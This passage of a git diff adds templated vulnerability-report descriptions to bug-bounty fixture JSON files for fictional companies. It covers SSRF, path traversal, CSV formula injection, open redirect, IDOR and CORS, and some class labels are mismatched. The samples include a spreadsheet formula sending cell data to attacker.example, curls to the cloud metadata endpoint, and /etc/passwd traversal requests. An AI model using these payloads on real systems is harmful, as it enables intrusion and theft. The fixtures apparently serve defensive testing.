+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22360,7 +22531,8 @@
           "offset": "2d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22519,7 +22691,8 @@
           "offset": "6d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -22653,7 +22826,8 @@
           "offset": "5d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22824,7 +22998,8 @@
           "offset": "7d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22962,7 +23137,8 @@
           "offset": "4d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23085,7 +23261,8 @@
           "offset": "4d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://erp.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23196,7 +23373,8 @@
           "offset": "23h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23327,7 +23505,8 @@
           "offset": "3d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23446,7 +23625,8 @@
           "offset": "5d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23585,7 +23765,8 @@
           "offset": "4d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://erp.laerchenquell-foods.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23733,7 +23914,8 @@
           "offset": "8d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://erp.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23844,7 +24026,8 @@
           "offset": "1d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://erp.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23967,7 +24150,8 @@
           "offset": "3d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24085,7 +24269,8 @@
           "offset": "7d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://erp.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24195,7 +24380,8 @@
           "offset": "2d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://suppliers.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/nebelstein_cloud_services_ag_reports.json b/fixtures/reports/nebelstein_cloud_services_ag_reports.json
index 7c912dc..b655812 100644
--- a/fixtures/reports/nebelstein_cloud_services_ag_reports.json
+++ b/fixtures/reports/nebelstein_cloud_services_ag_reports.json
@@ -42,7 +42,8 @@
           "offset": "6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -164,7 +165,8 @@
           "offset": "7d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -279,7 +281,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -431,7 +434,8 @@
           "offset": "2d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.nebelstein-cloud.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -563,7 +567,8 @@
           "offset": "4d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -710,7 +715,8 @@
           "offset": "3d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -872,7 +878,8 @@
           "offset": "4d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1015,7 +1022,8 @@
           "offset": "6d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1195,7 +1203,8 @@
           "offset": "6d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1285,7 +1294,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1437,7 +1447,8 @@
           "offset": "1d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1573,7 +1584,8 @@
           "offset": "3d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1673,7 +1685,8 @@
           "offset": "1d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.nebelstein-cloud.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1824,7 +1837,8 @@
           "offset": "5d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1964,7 +1978,8 @@
           "offset": "2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
